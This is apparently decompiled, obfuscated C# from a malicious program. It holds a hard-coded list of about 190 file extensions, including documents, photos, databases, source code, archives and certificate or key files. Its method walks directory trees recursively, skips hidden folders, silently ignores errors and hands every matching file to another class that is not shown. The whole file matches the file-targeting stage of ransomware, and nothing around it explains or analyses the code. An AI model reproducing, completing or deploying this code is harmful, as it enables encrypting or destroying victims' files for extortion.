using System;
using System.IO;
using System.Linq;

namespace ns0;

internal class Class6
{
	private readonly Class3 class3_0 = new Class3();

	private readonly string[] string_0 = new string[193]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".png", ".jpeg", ".gif", ".csv", ".py", ".sql", ".mdb",
		".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll",
		".c", ".cs", ".vb", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar",
		".mov", ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7z", ".ace",
		".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001",
		".mpeg", ".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent", ".3dm",
		".3g2", ".3gp", ".aaf", ".accdb", ".aep", ".aepx", ".aet", ".ai", ".aif", ".arw",
		".as", ".as3", ".asf", ".asx", ".bay", ".cdr", ".cer", ".class", ".cr2", ".crt",
		".crw", ".dbf", ".dcr", ".der", ".dng", ".docb", ".docm", ".dot", ".dotm", ".dotx",
		".dxf", ".dxg", ".efx", ".eps", ".erf", ".fla", ".flv", ".idml", ".iff", ".indb",
		".indd", ".indl", ".indt", ".inx", ".java", ".kdc", ".m3u", ".m3u8", ".m4u", ".max",
		".mdf", ".mef", ".mid", ".mpa", ".mrw", ".msg", ".nef", ".nrw", ".odb", ".odc",
		".odm", ".odp", ".ods", ".orf", ".p12", ".p7b", ".p7c", ".pef", ".pem", ".pfx",
		".plb", ".pmd", ".pot", ".potm", ".potx", ".ppam", ".ppj", ".pps", ".ppsm", ".ppsx",
		".pptm", ".prel", ".prproj", ".ps", ".pst", ".ptx", ".r3d", ".ra", ".raf", ".raw",
		".rb", ".rw2", ".rwl", ".sdf", ".sldm", ".sldx", ".sr2", ".srf", ".srw", ".svg",
		".swf", ".tif", ".vcf", ".vob", ".wav", ".wb2", ".wma", ".wmv", ".wpd", ".wps",
		".x3f", ".xla", ".xlam", ".xlk", ".xll", ".xlm", ".xlsb", ".xlsm", ".xlt", ".xltm",
		".xltx", ".xlw", ".xqx"
	};

	internal void method_0(string string_1, string string_2)
	{
		try
		{
			string[] files = Directory.GetFiles(string_1);
			string[] directories = Directory.GetDirectories(string_1);
			string[] array = files;
			foreach (string path in array)
			{
				if (string_0.Contains<string>(Path.GetExtension(path)) && !string.IsNullOrEmpty(Path.GetExtension(path)))
				{
					class3_0.method_0(path, string_2);
				}
			}
			string[] array2 = directories;
			foreach (string text in array2)
			{
				if ((File.GetAttributes(text) & FileAttributes.Hidden) != FileAttributes.Hidden)
				{
					method_0(text, string_2);
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
